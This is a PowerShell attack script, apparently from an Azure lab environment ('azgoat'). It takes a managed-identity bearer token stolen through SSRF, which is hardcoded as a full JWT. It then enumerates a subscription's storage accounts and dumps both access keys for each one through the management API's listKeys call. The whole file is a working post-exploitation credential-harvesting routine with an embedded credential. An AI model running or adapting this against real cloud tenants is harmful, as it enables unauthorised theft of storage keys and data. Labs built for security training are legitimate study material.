#------initialize the variables with subscriptionid and ManagedIdentity token obtained from the SSRF------#
$subsID="22a03a49-7d0c-4d63-9546-16817b82a440"
$MIToken="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Imwzc1EtNTBjQ0g0eEJWWkxIVEd3blNSNzY4MCIsImtpZCI6Imwzc1EtNTBjQ0g0eEJWWkxIVEd3blNSNzY4MCJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzYxNzYyODZiLWJiZDEtNDMwMy04M2VlLWY1NDkyNjE4ZjhhZi8iLCJpYXQiOjE2MzY1NDk4MDcsIm5iZiI6MTYzNjU0OTgwNywiZXhwIjoxNjM2NjM2NTA3LCJhaW8iOiJFMlpnWUlqNzl1cWZ3M2syVnhsaDgzMkxCWFlvQXdBPSIsImFwcGlkIjoiMzZjOTJjZjYtZTkzMC00OWZiLTk5ZGUtZjMyMzU5ZTNjOTNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvNjE3NjI4NmItYmJkMS00MzAzLTgzZWUtZjU0OTI2MThmOGFmLyIsIm9pZCI6IjM5YjViYWNhLWU2NzktNGQ5NC05OWMwLTc1Njg2OTIxZTk1YSIsInJoIjoiMC5BWEFBYXloMllkRzdBME9EN3ZWSkpoajRyX1lzeVRZdzZmdEptZDd6STFuanlUNXdBQUEuIiwic3ViIjoiMzliNWJhY2EtZTY3OS00ZDk0LTk5YzAtNzU2ODY5MjFlOTVhIiwidGlkIjoiNjE3NjI4NmItYmJkMS00MzAzLTgzZWUtZjU0OTI2MThmOGFmIiwidXRpIjoiclVNT3VKOTMzMFdRSG0yc1NoVnZBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zLzIyYTAzYTQ5LTdkMGMtNGQ2My05NTQ2LTE2ODE3YjgyYTQ0MC9yZXNvdXJjZWdyb3Vwcy9hemdvYXQvcHJvdmlkZXJzL01pY3Jvc29mdC5Db21wdXRlL3ZpcnR1YWxNYWNoaW5lcy9TU1JGbWFjaGluZSIsInhtc190Y2R0IjoiMTYxNDU5NTU3MCJ9.b70XRHZGbgt_mFDyICGd6Qmy-2uo8nKt6C_IoOWvC0-FkgLgr0Rk3HebE30vD_7w1YLYGI7CoCAtFIj9M0VzC34ZT-05vYFtuGtcXc3lRUQKhiX26KWn9hTBXFooYapGf65kmiR17sUGkH0dS2f9DF1LjLs8QkoUll6kQi_RtTKJflmn6exFXLzKcf-0hAe3dI-aTVocEhCcg4CMp6tMVEqKaG78-s6e1q-VzinRXTBw81UUipBZN4llHUZylERggjvePSetCbQSdo0W21zOUfgS-1-Q88y8bCUI2uOWt67HdIkri2UObwc5__b6MERyqV2oWU_bMJv-1Y-bz1Gw2w"
#---------Get List of Storage Accounts---------#
$responseKeys = Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$subsID,'/providers/Microsoft.Storage/storageAccounts?api-version=2019-06-01')) -Method GET -Headers @{ Authorization ="Bearer $MIToken"} -UseBasicParsing
$storageACCTS = ($responseKeys.Content | ConvertFrom-Json).value
# Create data table to house results
$TempTbl = New-Object System.Data.DataTable 
$TempTbl.Columns.Add("StorageAccount") | Out-Null
$TempTbl.Columns.Add("Key1") | Out-Null
$TempTbl.Columns.Add("Key2") | Out-Null
$TempTbl.Columns.Add("Key1-Permissions") | Out-Null
$TempTbl.Columns.Add("Key2-Permissions") | Out-Null

#---------Request access keys for all storage accounts---------#
$storageACCTS | ForEach-Object {

    # Do some split magic on the list of Storage accounts
    $accountName = $_.name
    $split1 = ($_.id -split "resourceGroups/")
    $split2 = ($split1 -Split "/")
    $SARG = $split2[4]

    #https://docs.microsoft.com/en-us/rest/api/storagerp/storageaccounts/listkeys#
    $responseKeys = (Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$subsID,'/resourceGroups/',$SARG,'/providers/Microsoft.Storage/storageAccounts/',$accountName,'/listKeys?api-version=2019-06-01')) -Method POST -Headers @{ Authorization ="Bearer $MIToken"} -UseBasicParsing).content
    $keylist = ($responseKeys| ConvertFrom-Json).keys
    
    # Write the keys to the table
    $TempTbl.Rows.Add($accountName, $keylist[0].value, $keylist[1].value, $keylist[0].permissions, $keylist[1].permissions) | Out-Null

}

Write-Output $TempTbl
